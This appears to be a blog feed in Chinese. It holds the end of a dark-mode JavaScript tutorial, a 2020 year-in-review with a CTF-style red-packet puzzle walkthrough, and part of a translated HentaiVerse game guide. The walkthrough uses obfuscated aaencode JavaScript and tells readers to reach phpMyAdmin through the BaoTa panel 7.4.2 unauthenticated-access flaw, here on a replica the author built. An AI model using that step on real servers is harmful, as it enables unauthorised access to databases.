getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability 